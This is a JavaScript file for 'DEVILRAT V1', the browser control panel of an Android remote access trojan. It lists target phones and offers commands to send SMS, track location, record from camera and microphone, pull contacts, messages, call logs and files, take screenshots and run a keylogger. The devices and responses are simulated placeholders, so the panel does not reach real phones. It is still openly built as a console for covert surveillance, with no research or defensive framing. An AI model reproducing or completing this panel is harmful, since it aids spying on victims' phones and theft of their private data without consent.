// DEVILRAT V1 - GitHub Pages Edition
// 👹 KEGELAPAN ABADI 🛐

class DevilRatController {
    constructor() {
        this.devices = [];
        this.commands = [];
        this.logs = [];
        this.selectedDevice = null;
        this.theme = 'dark';
        this.connectionStatus = 'connected';
        this.init();
    }

    init() {
        this.updateDomainDisplay();
        this.updateTime();
        this.loadDevices();
        this.setupEventListeners();
        this.startHeartbeat();
        this.addLog('System', 'DEVILRAT V1 initialized', 'success');
    }

    updateDomainDisplay() {
        const domain = window.location.hostname;
        document.getElementById('domainDisplay').textContent = `🌐 ${domain}`;
    }

    updateTime() {
        const now = new Date();
        document.getElementById('currentTime').textContent = 
            now.toLocaleTimeString('en-US', {hour12: false});
        setTimeout(() => this.updateTime(), 1000);
    }

    async loadDevices() {
        try {
            // Demo devices - in real app, fetch from API
            this.devices = [
                {
                    id: 'dev1',
                    model: 'Samsung Galaxy S23',
                    battery: '85%',
                    android: '13',
                    ip: '192.168.1.101',
                    status: 'online',
                    connected: new Date().toISOString()
                },
                {
                    id: 'dev2',
                    model: 'Google Pixel 7',
                    battery: '45%',
                    android: '14',
                    ip: '192.168.1.102',
                    status: 'online',
                    connected: new Date().toISOString()
                },
                {
                    id: 'dev3',
                    model: 'Xiaomi Redmi Note 12',
                    battery: '92%',
                    android: '12',
                    ip: '192.168.1.103',
                    status: 'offline',
                    connected: new Date().toISOString()
                }
            ];

            this.renderDevices();
            this.updateStats();
        } catch (error) {
            this.addLog('System', `Failed to load devices: ${error.message}`, 'error');
        }
    }

    renderDevices() {
        const deviceList = document.getElementById('deviceList');
        deviceList.innerHTML = '';

        this.devices.forEach(device => {
            const card = document.createElement('div');
            card.className = `device-card ${device.status}`;
            card.innerHTML = `
                <div class="device-header">
                    <div class="device-model">${device.model}</div>
                    <div class="device-status ${device.status}">${device.status.toUpperCase()}</div>
                </div>
                <div class="device-info">
                    <div>🔋 ${device.battery}</div>
                    <div>📱 Android ${device.android}</div>
                    <div>🌐 ${device.ip}</div>
                    <div>🕒 ${new Date(device.connected).toLocaleTimeString()}</div>
                </div>
            `;
            
            card.addEventListener('click', () => this.selectDevice(device.id));
            deviceList.appendChild(card);
        });
    }

    selectDevice(deviceId) {
        this.selectedDevice = deviceId;
        const device = this.devices.find(d => d.id === deviceId);
        this.addLog('Device', `Selected: ${device.model}`, 'success');
        
        // Highlight selected device
        document.querySelectorAll('.device-card').forEach(card => {
            card.classList.remove('selected');
        });
        document.querySelector(`.device-card[data-id="${deviceId}"]`)?.classList.add('selected');
    }

    updateStats() {
        const onlineCount = this.devices.filter(d => d.status === 'online').length;
        document.getElementById('deviceCount').textContent = this.devices.length;
        document.getElementById('onlineCount').textContent = onlineCount;
        document.getElementById('commandCount').textContent = this.commands.length;
    }

    setupEventListeners() {
        // Command buttons
        document.querySelectorAll('.cmd-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const command = e.target.dataset.command;
                this.showCommandModal(command);
            });
        });

        // Modal close on outside click
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.closeModal();
                }
            });
        });
    }

    showCommandModal(command) {
        if (!this.selectedDevice) {
            this.showDeviceSelection();
            return;
        }

        const modal = document.getElementById('commandModal');
        const title = document.getElementById('modalTitle');
        const body = document.getElementById('modalBody');
        const executeBtn = document.getElementById('modalExecute');

        let modalContent = '';
        const device = this.devices.find(d => d.id === this.selectedDevice);

        switch(command) {
            case 'sms':
                title.textContent = '📱 SEND SMS';
                modalContent = `
                    <div class="input-group">
                        <input type="text" id="smsNumber" class="input-field" placeholder="Phone number">
                    </div>
                    <div class="input-group">
                        <textarea id="smsMessage" class="textarea-field" placeholder="Message" rows="4"></textarea>
                    </div>
                `;
                executeBtn.onclick = () => this.sendSMS();
                break;

            case 'location':
                title.textContent = '📍 GET LOCATION';
                modalContent = `<p>Get current location from ${device.model}</p>`;
                executeBtn.onclick = () => this.executeCommand('get_location');
                break;

            case 'camera':
                title.textContent = '📸 CAMERA CONTROL';
                modalContent = `
                    <div class="input-group">
                        <select id="cameraType" class="input-field">
                            <option value="front">Front Camera</option>
                            <option value="back">Back Camera</option>
                            <option value="selfie">Selfie Camera</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <input type="number" id="cameraDuration" class="input-field" placeholder="Duration (seconds)" value="10">
                    </div>
                `;
                executeBtn.onclick = () => this.executeCommand('camera');
                break;

            case 'mic':
                title.textContent = '🎤 MICROPHONE';
                modalContent = `
                    <div class="input-group">
                        <input type="number" id="micDuration" class="input-field" placeholder="Duration (seconds)" value="30">
                    </div>
                `;
                executeBtn.onclick = () => this.executeCommand('microphone');
                break;

            default:
                title.textContent = command.toUpperCase();
                modalContent = `<p>Execute ${command} on ${device.model}</p>`;
                executeBtn.onclick = () => this.executeCommand(command);
        }

        body.innerHTML = modalContent;
        modal.style.display = 'flex';
    }

    showDeviceSelection() {
        const modal = document.getElementById('deviceModal');
        const list = document.getElementById('deviceSelectList');
        
        list.innerHTML = '';
        this.devices.forEach(device => {
            const btn = document.createElement('button');
            btn.className = 'cmd-btn';
            btn.textContent = `${device.model} (${device.status})`;
            btn.addEventListener('click', () => {
                this.selectedDevice = device.id;
                this.closeDeviceModal();
                this.addLog('System', `Selected device: ${device.model}`, 'success');
            });
            list.appendChild(btn);
        });

        modal.style.display = 'flex';
    }

    closeModal() {
        document.getElementById('commandModal').style.display = 'none';
    }

    closeDeviceModal() {
        document.getElementById('deviceModal').style.display = 'none';
    }

    sendSMS() {
        const number = document.getElementById('smsNumber').value;
        const message = document.getElementById('smsMessage').value;
        
        if (!number || !message) {
            this.addLog('Command', 'SMS failed: Missing number or message', 'error');
            return;
        }

        this.executeCommand('send_sms', { number, message });
    }

    async executeCommand(command, params = {}) {
        if (!this.selectedDevice) {
            this.addLog('Command', 'No device selected', 'error');
            return;
        }

        const device = this.devices.find(d => d.id === this.selectedDevice);
        
        // Demo execution - in real app, call API
        this.addLog(device.model, `Executing: ${command}`, 'success');
        
        // Simulate API call
        await this.simulateAPIRequest(command, params);
        
        this.commands.push({
            device: device.id,
            command,
            params,
            timestamp: new Date().toISOString()
        });
        
        this.updateStats();
        this.closeModal();
    }

    async simulateAPIRequest(command, params) {
        return new Promise(resolve => {
            setTimeout(() => {
                // Simulate success response
                const responses = {
                    'send_sms': { status: 'sent', message: 'SMS delivered' },
                    'get_location': { status: 'success', lat: -6.2088, lng: 106.8456 },
                    'camera': { status: 'recording', duration: params.duration || 10 },
                    'microphone': { status: 'recording', duration: params.duration || 30 },
                    'contacts': { status: 'success', count: 150 },
                    'messages': { status: 'success', count: 234 },
                    'calls': { status: 'success', count: 89 },
                    'files': { status: 'success', files: ['/sdcard/DCIM', '/sdcard/Download'] },
                    'toast': { status: 'shown', message: params.message },
                    'vibrate': { status: 'vibrating', duration: params.duration || 1000 },
                    'screenshot': { status: 'captured', path: '/sdcard/Pictures/screenshot.png' },
                    'keylogger': { status: 'started', log: 'keylog.txt' }
                };

                const response = responses[command] || { status: 'executed', command };
                this.addLog('Response', JSON.stringify(response), 'success');
                resolve(response);
            }, 1000);
        });
    }

    executeCustomCommand() {
        const command = document.getElementById('customCommand').value;
        const paramsText = document.getElementById('commandParams').value;
        
        if (!command) {
            this.addLog('Command', 'No command specified', 'error');
            return;
        }

        let params = {};
        if (paramsText) {
            try {
                params = JSON.parse(paramsText);
            } catch {
                this.addLog('Command', 'Invalid JSON parameters', 'error');
                return;
            }
        }

        this.executeCommand(command, params);
    }

    addLog(source, message, status = 'info') {
        const log = {
            timestamp: new Date().toLocaleTimeString(),
            source,
            message,
            status
        };

        this.logs.unshift(log);
        if (this.logs.length > 100) this.logs.pop();

        this.renderLogs();
    }

    renderLogs() {
        const logsContent = document.getElementById('logsContent');
        logsContent.innerHTML = '';

        this.logs.forEach(log => {
            const logItem = document.createElement('div');
            logItem.className = 'log-item';
            logItem.innerHTML = `
                <div class="log-time">${log.timestamp}</div>
                <div class="log-device">${log.source}</div>
                <div class="log-command">${log.message}</div>
                <div class="log-status ${log.status}">${log.status.toUpperCase()}</div>
            `;
            logsContent.appendChild(logItem);
        });
    }

    clearLogs() {
        this.logs = [];
        this.renderLogs();
        this.addLog('System', 'Logs cleared', 'success');
    }

    startHeartbeat() {
        setInterval(() => {
            this.connectionStatus = 'connected';
            document.getElementById('connectionStatus').textContent = '🟢 CONNECTED';
            document.getElementById('connectionStatus').className = 'pulse';
        }, 5000);
    }

    toggleTheme() {
        this.theme = this.theme === 'dark' ? 'light' : 'dark';
        document.documentElement.setAttribute('data-theme', this.theme);
        this.addLog('System', `Theme switched to ${this.theme}`, 'success');
    }

    exportLogs() {
        const data = {
            timestamp: new Date().toISOString(),
            devices: this.devices,
            commands: this.commands,
            logs: this.logs
        };

        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `devilrat-logs-${Date.now()}.json`;
        a.click();
        
        this.addLog('System', 'Logs exported', 'success');
    }

    showInfo() {
        const info = `
DEVILRAT V1 - GitHub Pages Edition
Version: 1.0.0
Domain: ${window.location.hostname}
Devices: ${this.devices.length}
Commands: ${this.commands.length}
Logs: ${this.logs.length}
Status: Operational
        `;
        alert(info);
    }
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', () => {
    window.dev = new DevilRatController();
});

// Utility functions exposed globally
function loadDevices() { window.dev?.loadDevices(); }
function clearLogs() { window.dev?.clearLogs(); }
function closeModal() { window.dev?.closeModal(); }
function closeDeviceModal() { window.dev?.closeDeviceModal(); }
function toggleTheme() { window.dev?.toggleTheme(); }
function exportLogs() { window.dev?.exportLogs(); }
function showInfo() { window.dev?.showInfo(); }
function executeCustomCommand() { window.dev?.executeCustomCommand(); }
